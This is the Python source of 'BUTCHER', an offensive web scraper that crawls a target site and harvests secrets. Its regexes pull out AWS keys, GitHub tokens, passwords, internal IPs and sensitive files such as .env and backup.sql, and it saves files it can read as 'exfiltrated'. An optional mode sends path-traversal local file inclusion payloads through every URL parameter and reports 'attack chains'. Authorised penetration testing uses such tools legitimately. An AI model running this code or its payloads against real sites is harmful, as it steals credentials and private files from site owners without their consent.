#!/usr/bin/env python3
"""
BUTCHER — Surgical Web Scraper
High-fidelity data extraction engine for the Hellhound ecosystem.
"""

import asyncio
import argparse
import sys
import os
import time
import json
import re
import csv
import random
import subprocess
import shutil
from datetime import datetime
from typing import List, Dict, Any, Optional, Set
from urllib.parse import urljoin, urlparse
import aiohttp
from bs4 import BeautifulSoup, Comment

# ── Colors & Branding ────────────────────────────────────────────────────────
class C:
    RED     = "\033[91m"          # Banner, CRITICAL, borders
    ORANGE  = "\033[38;5;214m"    # Labels, values, JS/assets
    BLUE    = "\033[94m"          # Section headers, VERIFIED tags
    CYAN    = "\033[96m"          # URLs in spider feed
    GREEN   = "\033[92m"          # Forms, POST endpoints, SUCCESS
    YELLOW  = "\033[93m"          # Filenames in intel
    WHITE   = "\033[97m"          # Content text
    GRAY    = "\033[90m"          # Dim metadata
    RST     = "\033[0m"           # Reset

def get_tw():
    try:
        tw = shutil.get_terminal_size().columns
        return tw if tw > 10 else 100
    except: return 100

BANNER = r"""
██████╗ ██╗   ██╗████████╗ ██████╗██╗  ██╗███████╗██████╗ 
██╔══██╗██║   ██║╚══██╔══╝██╔════╝██║  ██║██╔════╝██╔══██╗
██████╔╝██║   ██║   ██║   ██║     ███████║█████╗  ██████╔╝
██╔══██╗██║   ██║   ██║   ██║     ██╔══██║██╔══╝  ██╔══██╗
██████╔╝╚██████╔╝   ██║   ╚██████╗██║  ██║███████╗██║  ██║
╚═════╝  ╚═════╝    ╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
"""

def print_banner():
    tw = get_tw()
    print("")
    for line in BANNER.strip().split("\n"):
        print(f"{C.RED}{line.center(tw)}{C.RST}")
    print(f"{C.ORANGE}{'[ Created by L4ZZ3RJ0D — @l4zz3rj0d ]'.center(tw)}{C.RST}\n")

# ── HUD Engine ────────────────────────────────────────────────────────────────
class ButcherHUD:
    def __init__(self, target: str, args: Any):
        self.target = target
        self.args = args
        self.start_time = time.time()
        self.total_score = 0
        self.findings_count = 0
        self.categories = {}
        self.quiet = args.quiet
        self.silent = getattr(args, 'silent', False)

    def border(self):
        if self.quiet or self.silent: return
        print(f"    {C.RED}{'━' * (get_tw()-8)}{C.RST}")

    def header(self):
        if self.quiet or self.silent: return
        self.border()
        mode = "browser" if self.args.browser else "autonomous"
        print(f"\n      {C.BLUE}{'TARGET'.ljust(10)}{C.RST}: {C.ORANGE}{self.target}{C.RST}")
        print(f"      {C.BLUE}{'MODE'.ljust(10)}{C.RST}: {C.ORANGE}{mode}{C.RST}")
        print(f"      {C.BLUE}{'DEPTH'.ljust(10)}{C.RST}: {C.ORANGE}{self.args.depth}{C.RST}")
        print(f"      {C.BLUE}{'TIMEOUT'.ljust(10)}{C.RST}: {C.ORANGE}{self.args.timeout}s{C.RST}\n")
        self.border()

    def section(self, title: str):
        if self.quiet or self.silent: return
        print(f"\n    {C.BLUE}{title.upper()}{C.RST}\n")

    def add_finding(self, ftype: str, content: str, score: int):
        if self.silent: return
        if ftype not in self.categories:
            self.categories[ftype] = {"count": 0, "findings": []}
        self.categories[ftype]["count"] += 1
        self.categories[ftype]["findings"].append(content)
        self.total_score += score
        self.findings_count += 1

    def display_findings(self):
        if self.silent or not self.categories: return
        self.section("EXTRACTIONS")
        for ftype, data in self.categories.items():
            print(f"      {C.ORANGE}{ftype.upper()}{C.RST} ({C.WHITE}{data['count']}{C.RST})")
            for val in data["findings"]:
                clean_val = val.strip().replace("\n", " ")
                if len(clean_val) > 80: clean_val = clean_val[:77] + "..."
                print(f"        {C.WHITE}{clean_val}{C.RST}")

    def loot(self, type_label: str, content: str, url: str, note: str = ""):
        print(f"      {C.WHITE}{type_label}{C.RST}")
        if note: print(f"        {C.BLUE}{note}{C.RST}")
        lines = content.splitlines()
        for line in lines[:50]:
            line = line.strip()
            if line:
                print(f"        {C.WHITE}{line}{C.RST}")
        print(f"        {C.ORANGE}URL: {url}{C.RST}\n")

    def footer(self, findings: int, score: int, duration: float):
        self.section("SUMMARY")
        print(f"      {C.BLUE}{'Findings'.ljust(15)}{C.RST}: {C.ORANGE}{findings}{C.RST}")
        sev = "CRITICAL" if score >= 80 else "HIGH" if score >= 50 else "MEDIUM"
        print(f"      {C.BLUE}{'Risk Score'.ljust(15)}{C.RST}: {C.RED}{score} ({sev}){C.RST}")
        print(f"      {C.BLUE}{'Time'.ljust(15)}{C.RST}: {C.WHITE}{duration:.1f}s{C.RST}")
        print(f"      {C.BLUE}{'Output'.ljust(15)}{C.RST}: {C.ORANGE}{self.args.output}{C.RST}\n")
        self.border()
        print(f"      {C.BLUE}✓ Done.{C.RST}\n")

    def summary(self, filename: str):
        if self.silent: return
        elapsed = time.time() - self.start_time
        self.footer(self.findings_count, self.total_score, elapsed)

# ── Screenshot Manager ───────────────────────────────────────────────────────
class ScreenshotManager:
    def __init__(self, output_dir: str = "./screenshots"):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
    
    async def take_screenshot(self, url: str, vuln_type: str, page) -> Optional[str]:
        try:
            timestamp = datetime.now().strftime('%H%M%S')
            domain = urlparse(url).netloc.replace('.', '_')
            filename = f"{domain}_{vuln_type}_{timestamp}.png"
            filepath = os.path.join(self.output_dir, filename)
            await page.goto(url, wait_until="networkidle", timeout=15000)
            await page.screenshot(path=filepath, full_page=False)
            return filepath
        except: return None

# ── Extraction Matrix ─────────────────────────────────────────────────────────
class ExtractionMatrix:
    PATTERNS = {
        "emails": {"regex": r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+', "score": 1, "label": "EMAIL"},
        "ips": {"regex": r'\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b', "score": 20, "label": "INTERNAL_IP"},
        "aws_key": {"regex": r'(?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}', "score": 100, "label": "AWS_KEY"},
        "google_api": {"regex": r'AIza[0-9A-Za-z\\-_]{35}', "score": 50, "label": "GOOGLE_API"},
        "github_token": {"regex": r'ghp_[a-zA-Z0-9]{36}', "score": 80, "label": "GITHUB_TOKEN"},
        "credentials": {"regex": r'\b(?i)(?:password|passwd|pass|db_password|db_user|api_key|secret_key|token|auth_token)\b\s*[:=]\s*["\']?([a-zA-Z0-9!@#$%^&*()_+]{4,64})["\']?', "score": 100, "label": "CREDENTIAL"},
        "sensitive_files": {"regex": r'\b(?:\.env|wp-config\.php|config\.php|settings\.py|database\.yml|\.git/config|backup\.sql|dump\.sql|debug\.log|secret[^\s]*)\b', "score": 40, "label": "SENSITIVE_FILE"}
    }

    @staticmethod
    def extract_from_text(text: str, filters: Set[str]) -> List[Dict[str, Any]]:
        findings = []
        for key, meta in ExtractionMatrix.PATTERNS.items():
            if filters and key not in filters and meta['label'].lower() not in filters:
                continue
            matches = re.findall(meta['regex'], text)
            for match in set(matches):
                content = match[0] if isinstance(match, tuple) else match
                findings.append({"type": meta['label'], "content": content, "score": meta['score']})
        return findings

    @staticmethod
    def extract_from_soup(soup: BeautifulSoup, filters: Set[str]) -> List[Dict[str, Any]]:
        findings = []
        if not filters or "hidden" in filters:
            for inp in soup.find_all("input", type="hidden"):
                findings.append({"type": "HIDDEN_INPUT", "content": f"{inp.get('name', 'N/A')}={inp.get('value', 'N/A')}", "score": 5})
        if not filters or "comments" in filters:
            for comment in soup.find_all(string=lambda text: isinstance(text, Comment)):
                if any(k in comment.upper() for k in ["TODO", "FIXME", "DEBUG", "HACK", "XXX", "SECRET"]):
                    findings.append({"type": "SENSITIVE_COMMENT", "content": comment.strip(), "score": 10})
        return findings

# ── Universal Helpers ─────────────────────────────────────────────────────────
def is_file_url(url: str) -> bool:
    parsed = urlparse(url)
    path = parsed.path.lower().rstrip('/')
    if not path or path == '/': return False
    page_exts = ['.html', '.htm', '.php', '.asp', '.aspx', '.jsp']
    ext = os.path.splitext(path)[1]
    if ext and ext not in page_exts: return True
    sensitive = ['secret', 'flag', 'password', 'config', 'backup', 'debug', 'admin', '.env', '.git', 'robots', 'sitemap']
    if any(s in path for s in sensitive): return True
    if not ext: return True
    return False

def is_meaningful_content(content: str) -> bool:
    text = content.strip()
    if len(text) < 10: return False
    lower = text[:500].lower()
    if lower.startswith('<!doctype') or lower.startswith('<html'): return False
    return True

def extract_clean_text(html: str) -> str:
    try:
        soup = BeautifulSoup(html, 'html.parser')
        for tag in soup(['script', 'style']): tag.decompose()
        return soup.get_text(separator="\n").strip()
    except: return html.strip()[:2000]

# ── Recon Engine ──────────────────────────────────────────────────────────────
async def run_external_spider(target: str, depth: int, browser: bool, hud: ButcherHUD):
    _script_dir = os.path.dirname(os.path.abspath(__file__))
    spider_paths = [os.path.join(_script_dir, "spider.py"), os.path.join(os.path.dirname(_script_dir), "Hellhound-Spider", "spider.py")]
    spider_path = next((p for p in spider_paths if os.path.exists(p)), None)
    if not spider_path: return [{"url": target, "method": "GET"}]

    cmd = [sys.executable, spider_path, target, "-d", str(depth), "--verbose"]
    if not browser: cmd.append("--no-playwright")

    hud.section("DISCOVERY")
    env = os.environ.copy()
    env["PYTHONUNBUFFERED"] = "1"
    proc = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, env=env)

    S_G, S_Y, S_CY, S_R, S_W, S_RST = "\033[92m", "\033[93m", "\033[96m", "\033[91m", "\033[97m", "\033[0m"
    discovered_urls, seen_urls = [], set()

    while True:
        line = await proc.stdout.readline()
        if not line: break
        decoded = line.decode().strip()
        clean = re.sub(r'\033\[[0-9;]*m', '', decoded).strip()
        if not clean or any(x in clean for x in ["█", "▓", "▒", "░", "━", "Crawling:", "started"]): continue
        
        url_match = re.search(r'(https?://[^\s\]\)]+)', clean)
        if not url_match: continue
        url = url_match.group(1)
        if url in seen_urls: continue
        seen_urls.add(url)

        if "[!]" in clean or "Auth-wall" in clean:
            print(f"      {S_R}[!]{S_RST} {S_Y}{clean.split(']',1)[-1].strip()}{S_RST}")
        elif url.endswith(".js"):
            print(f"      {S_Y}JS{S_RST}  {S_W}{url}{S_RST}")
        elif "Crawl" in clean:
            print(f"      {S_CY}↓{S_RST}  {S_W}{url}{S_RST}")
        else:
            print(f"      {S_G}↳{S_RST}  {S_W}{url}{S_RST}")

        discovered_urls.append({"url": url, "method": "GET"})

    await proc.wait()
    return discovered_urls if discovered_urls else [{"url": target, "method": "GET"}]

# ── Scraper Core ──────────────────────────────────────────────────────────────
class ButcherEngine:
    def __init__(self, args):
        self.args = args
        self.findings = []
        self.filters = set(args.extract.split(",")) if args.extract else set()
        self.endpoints_list = []

    async def run(self, hud: ButcherHUD, page=None):
        endpoints = await run_external_spider(self.args.target, self.args.depth, self.args.browser, hud)
        self.endpoints_list = endpoints
        screenshot_mgr = ScreenshotManager(self.args.screenshot_dir) if self.args.screenshot else None

        async with aiohttp.ClientSession(headers={"User-Agent": "Mozilla/5.0"}) as session:
            for ep in endpoints[:self.args.max_pages]:
                url = ep["url"]
                if any(ex in url for ex in self.args.exclude.split(",")): continue
                print(f"      {C.ORANGE}[→]{C.RST} Scrapping: {C.WHITE}{url}{C.RST}")
                self.findings.append({"type": "SURFACE", "content": url, "score": 10, "url": url})
                try:
                    async with session.get(url, timeout=self.args.timeout) as resp:
                        html = await resp.text()
                        results = self.perform_extraction(html)
                        screenshot_taken = False
                        for res in results:
                            res["url"] = url
                            hud.add_finding(res["type"], res["content"], res["score"])
                            self.findings.append(res)
                            if screenshot_mgr and page and not screenshot_taken:
                                ss = await screenshot_mgr.take_screenshot(url, "extraction", page)
                                if ss: print(f"      📸 Screenshot: {C.CYAN}{ss}{C.RST}"); screenshot_taken = True
                        
                        if is_file_url(url) and is_meaningful_content(html):
                            filename = urlparse(url).path.split('/')[-1] or url
                            clean = self._format_content(html, filename)
                            hud.loot(filename, clean[:self.args.max_content_display], url, f"{C.CYAN}[DEFAULT EXTRACTION]{C.RST}")
                            self.findings.append({"type": "EXFILTRATED_FILE", "content": filename, "score": 50, "url": url})
                            if screenshot_mgr and page and not screenshot_taken:
                                await screenshot_mgr.take_screenshot(url, "exfiltration", page)
                except: pass

    def perform_extraction(self, html: str) -> List[Dict[str, Any]]:
        soup = BeautifulSoup(html, "html.parser")
        return ExtractionMatrix.extract_from_text(soup.get_text(), self.filters) + ExtractionMatrix.extract_from_soup(soup, self.filters)

    def _format_content(self, content: str, filename: str) -> str:
        if '<html' in content.lower(): return extract_clean_text(content)
        return content.strip()

# ── Intelligence Engine ───────────────────────────────────────────────────────
class TargetIntelligenceEngine:
    def __init__(self, endpoints: List[Dict[str, Any]], args: Any):
        self.endpoints = endpoints
        self.args = args
        self.chains = []
        self.tested = set()
        self.successful_files, self.blocked_files = set(), set()
        self.screenshot_mgr = ScreenshotManager(args.screenshot_dir) if args.screenshot else None

    async def run_full_scan(self, hud: ButcherHUD, page=None):
        file_urls = [ep for ep in self.endpoints if is_file_url(ep['url'])]
        param_urls = [ep for ep in self.endpoints if '?' in ep['url']]

        print(f"      {C.BLUE}[INTEL]{C.RST} {C.WHITE}Found {len(file_urls)} file URLs, {len(param_urls)} parameterized endpoints{C.RST}")
        async with aiohttp.ClientSession(headers={'User-Agent': 'Mozilla/5.0'}) as session:
            if file_urls:
                hud.section("DIRECT ACCESS SCAN")
                for ep in file_urls:
                    url = ep['url']
                    if url in self.tested: continue
                    self.tested.add(url)
                    await self._test_direct_access(session, url, hud, page)

            if param_urls:
                hud.section("LFI PROBE")
                targets = list(set(list(self.successful_files) + list(self.blocked_files)))
                for ep in param_urls:
                    url = ep['url']
                    parsed = urlparse(url)
                    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    params = [p.split('=')[0] for p in parsed.query.split('&') if '=' in p]
                    for param in params:
                        for target_file in targets:
                            if target_file not in self.successful_files:
                                await self._test_lfi(session, base_url, param, target_file, hud, page)

    async def _test_direct_access(self, session, url, hud, page):
        filename = urlparse(url).path.split('/')[-1] or url
        print(f"      {C.CYAN}[→]{C.RST} Testing: {C.WHITE}{filename}{C.RST}")
        try:
            async with session.get(url) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    if is_meaningful_content(content):
                        hud.loot(filename, content[:self.args.max_content_display], url, f"{C.GREEN}[VERIFIED]{C.RST}")
                        self.chains.append({'type': 'DIRECT', 'file': filename, 'url': url})
                        self.successful_files.add(filename)
                        if self.screenshot_mgr and page: await self.screenshot_mgr.take_screenshot(url, "direct", page)
                elif resp.status in [403, 404]:
                    self.blocked_files.add(filename)
        except: pass

    async def _test_lfi(self, session, base_url, param, target_file, hud, page):
        payloads = [target_file, f"../{target_file}", f"../../{target_file}"]
        for payload in payloads:
            url = f"{base_url}?{param}={payload}"
            try:
                async with session.get(url) as resp:
                    if resp.status == 200 and is_meaningful_content(await resp.text()):
                        content = await resp.text()
                        hud.loot(target_file, content[:self.args.max_content_display], url, f"{C.GREEN}[VERIFIED] LFI via {param}{C.RST}")
                        self.chains.append({'type': 'LFI', 'file': target_file, 'url': url, 'param': param})
                        self.successful_files.add(target_file)
                        if self.screenshot_mgr and page: await self.screenshot_mgr.take_screenshot(url, "lfi", page)
                        return True
            except: continue
        return False

# ── CLI ───────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="Butcher Surgical Discovery Engine")
    parser.add_argument("target", nargs="?", help="Target URL")
    parser.add_argument("-b", "--browser", action="store_true")
    parser.add_argument("-e", "--extract", default="")
    parser.add_argument("-o", "--output")
    parser.add_argument("-O", "--output-format", choices=["json", "csv", "markdown"], default="json")
    parser.add_argument("-d", "--depth", type=int, default=3)
    parser.add_argument("-m", "--max-pages", type=int, default=200)
    parser.add_argument("-w", "--timeout", type=int, default=15)
    parser.add_argument("-x", "--exclude", default="logout,delete")
    parser.add_argument("-q", "--quiet", action="store_true")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("-i", "--intel", action="store_true")
    parser.add_argument("-sc", "--screenshot", action="store_true")
    parser.add_argument("--screenshot-dir", default="./screenshots")
    parser.add_argument("--vuln-type", default="all")
    parser.add_argument("--aggressive", action="store_true")
    parser.add_argument("--max-content-display", type=int, default=5000)
    parser.add_argument("--vuln-auto-verify", action="store_true", default=True)
    parser.add_argument("--no-banner", action="store_true")
    args = parser.parse_args()

    if not args.target: parser.print_help(); sys.exit(0)
    if not args.target.startswith("http"): args.target = "http://" + args.target
    if not args.output:
        domain = urlparse(args.target).netloc.replace(".", "_")
        args.output = f"butcher_{domain}.json"

    if not args.no_banner: print_banner()
    hud = ButcherHUD(args.target, args)
    hud.header()

    async def run_scan():
        start_time = time.time()
        browser, page = None, None
        if args.screenshot:
            try:
                from playwright.async_api import async_playwright
                p = await async_playwright().start()
                browser = await p.chromium.launch(headless=True)
                page = await browser.new_page()
            except: args.screenshot = False

        engine = ButcherEngine(args)
        await engine.run(hud, page)

        if args.intel:
            hud.border()
            intel = TargetIntelligenceEngine(engine.endpoints_list, args)
            await intel.run_full_scan(hud, page)
            if intel.chains:
                hud.section("ATTACK CHAINS")
                for c in intel.chains:
                    print(f"        {C.GREEN}✓{C.RST} {C.RED}{c['type']} → {c['file']} (CRITICAL){C.RST}")

        if browser: await browser.close()
        hud.footer(hud.findings_count, hud.total_score, time.time() - start_time)
        with open(args.output, "w") as f: json.dump(engine.findings, f, indent=4)

    asyncio.run(run_scan())

if __name__ == "__main__":
    main()
